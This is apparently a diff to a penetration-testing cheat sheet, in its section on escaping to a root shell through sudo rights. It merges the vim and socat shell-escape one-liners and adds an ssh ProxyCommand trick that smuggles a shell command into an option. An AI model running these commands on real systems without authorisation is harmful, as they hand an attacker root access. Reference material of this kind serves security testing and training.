@@ -116,16 +116,12 @@ sudo bash
 
 If we are allowed to run a command as sudo:
 
-* VIM
+* Common commands
 
 ```ps
 $ sudo vim -c ':!/bin/sh'
-```
-
-* Socat
-
-```ps
 $ sudo socat stdin exec:/bin/bash
+$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
 * [apport-cli](https://manpages.ubuntu.com/manpages/focal/en/man1/apport-cli.1.html) 2.26.0 and earlier has a vulnerability ([CVE-2023-1326](https://nvd.nist.gov/vuln/detail/CVE-2023-1326)) 
